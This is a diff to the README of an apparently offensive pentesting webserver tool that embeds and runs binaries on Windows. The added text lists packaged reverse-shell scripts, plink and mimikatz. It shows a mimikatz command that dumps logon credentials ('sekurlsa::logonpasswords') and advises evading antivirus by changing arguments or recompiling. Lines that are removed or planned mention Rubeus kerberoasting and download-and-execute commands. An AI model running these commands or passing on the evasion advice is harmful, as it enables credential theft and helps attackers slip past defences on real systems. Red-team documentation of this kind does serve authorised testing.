@@ -84,10 +84,29 @@ Sharing /home/nodauf on 8080 ...
 Sharing /tmp/private on 8080 ...
 ```
 
-### Run embedded binary (only on Windows)
+### Embedded binary (only on Windows)
+
+List the embedded binaries:
+
 ```
-C:/Users/Nodauf>.\webserver.exe run Rubeus.exe kerberoast 
+C:\Users\Nodauf>.\webserver.exe run  
+Usage:
+.\webserver.exe run <binary> "<args>"
+
+Packaged Binaries:
+Invoke-PowerShellTcp.ps1
+mimikatz.exe
+php-reverse-shell.php
+plink.exe
 ```
+
+Run binary with arguments:
+
+```
+C:\Users\Nodauf>.\webserver.exe run mimikatz.exe "privilege::debug sekurlsa::logonpasswords"
+....
+```
+Running binary this way could help bypassing AV protections. Sometimes the arguments sent to the binary may be catch by the AV, if possible use the interactive CLI of the binary (like mimikatz) or recompile the binary to change the arguments name.
 
 ## Features
 
@@ -100,10 +119,10 @@ C:/Users/Nodauf>.\webserver.exe run Rubeus.exe kerberoast
 * Embedded files
 * Run embedded binary written in C# (only available on Windows)
 * Create a folder from the browser
+* Ability to execute embedded binary
 
 ## Todo
 
-* Ability to execute embedded binary in C# and C
 * Implement (go-mimikatz)[https://github.com/vyrus001/go-mimikatz]
 * Add feature for search and replace in embedded files (for fill the IP address for example)
 * JS/CSS menu to give command line in powershell, some gtfobins, curl, wget to download and execute 
